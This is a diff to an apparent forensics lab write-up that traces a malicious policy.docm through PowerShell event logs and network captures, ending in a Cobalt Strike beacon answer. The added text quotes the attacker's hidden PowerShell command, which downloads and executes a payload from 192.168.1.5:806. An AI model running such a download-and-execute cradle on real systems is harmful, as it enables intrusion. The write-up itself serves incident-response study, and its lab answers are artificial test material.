@@ -522,7 +522,7 @@ Malicious Powershell Script Execution:
 ![image](https://github.com/user-attachments/assets/76c9edc4-6c82-41fe-9af1-1ad69081318a)
 
 
-72. Now refer back way to our first finding when searching the red flag indicator for `policy.docm` file. At **Windows Powershell** event log we previously identified a suspicious powershell execution.
+72. Now refer back way to our first finding when searching the red flag indicator for `policy.docm` file. At **Microsoft-Windows-Powershell-Operation** event log we previously identified a suspicious powershell execution.
 73. However, since the threat actor not physically accessed the threat actor's device, hence the activities related to this can be seen at the pcap file (which captured all network traffic communications). Although, we can decode the base64 by manually copy the value at each log with eventID `4101`, but let's see if the powershell execution captured as a whole in one packet data.
 74. Upon reviewing each packet log, we can see different IP comes in traffic --> `192.168.1.7` and this IP communicates with `192.168.1.5`.
 
@@ -564,9 +564,22 @@ Malicious Powershell Script Execution:
 
 80. Download the file and pass it to threat intelligence, found the binary is indeed a malicious file.
 
-![image](https://github.com/user-attachments/assets/1831697a-084e-46c3-9ffd-70ff2c6d40fa)
+![image](https://github.com/user-attachments/assets/4433ba4c-2640-43d8-9d70-0700b656e124)
 
-89. However we still did not find the command used by the threat actor to gain initial access, based on the cyber kill chain, this command should refer to the malware installation command.
+
+89. However we still did not find the command used by the threat actor to gain initial access, based on the cyber kill chain, this command should refer to the malware installation command. Anyway after parsed and reviewing the `Windows Powershell` event log using `EvtxEcmd.exe` and `Timeline Explorer`, finally found the command used by the threat actor to gained initial acccess (command provided inside the `policy.docm` file).
+90. Great! Now we know the command used by the threat actor's for initial access is --> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`
+
+> TIMELINE EXPLORER OF ANALYZING Windows Powershell EVENT LOG
+
+```
+.\EvtxECmd.exe -f "C:\Cases\APTN1ghtm4r3\DiskImage\C\Windows\System32\winevt\logs\Windows PowerShell.evtx" --csv . --csvf "powershell-operation.csv"
+```
+
+![image](https://github.com/user-attachments/assets/4fec19bf-b060-42c7-922c-06b711073865)
+
+
+90. Awesome! We found the installation command of binary `a` which comes from the threat actor's server and the activity along with it's content indeed recorded at the pcap file. This command usage is for initial access to the victim's machine, which then later on backdoor created by installing another malware inside the victim's machine (the encoded base64 logic).
 
 > 21ST QUESTION --> ANS: `trojan.cobaltstrike/beacon`
 
